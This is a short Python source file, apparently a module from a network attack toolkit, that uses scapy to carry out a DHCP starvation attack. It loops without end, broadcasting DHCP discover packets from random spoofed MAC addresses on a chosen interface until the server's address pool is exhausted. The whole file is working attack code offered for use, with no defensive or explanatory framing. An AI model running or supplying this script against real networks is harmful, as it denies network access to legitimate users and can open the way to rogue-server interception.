# -*- coding: utf-8 -*-
import logging
logging.getLogger("scapy.runtime").setLevel(logging.WARNING)

from scapy.all import Ether, RandMAC, sendp
from scapy.layers.inet import IP, UDP
from scapy.layers.dhcp import BOOTP, DHCP
from termcolor import colored
import six


def run(interface, verbose):

    if len(interface) > 0:
        inter = str(interface[0])

        try:
            six.print_(colored("[*]", "blue"), "Running DHCP DISCOVER ATTACK...")
            while 1:
                src_mac = str(RandMAC())
                ethernet = Ether(dst='ff:ff:ff:ff:ff:ff', src=src_mac, type=0x800)
                ip = IP(src="0.0.0.0", dst="255.255.255.255")
                udp = UDP(sport=68, dport=67)
                bootps = BOOTP(chaddr=src_mac, ciaddr='0.0.0.0', xid=0x01020304, flags=1)
                dhcps = DHCP(options=[("message-type", "discover"), "end"])
                packet = ethernet / ip / udp / bootps / dhcps
                sendp(packet, iface=inter, verbose=verbose)
        except KeyboardInterrupt:
            pass


def run_attack(config):
    run(config.interface, config.verbose)

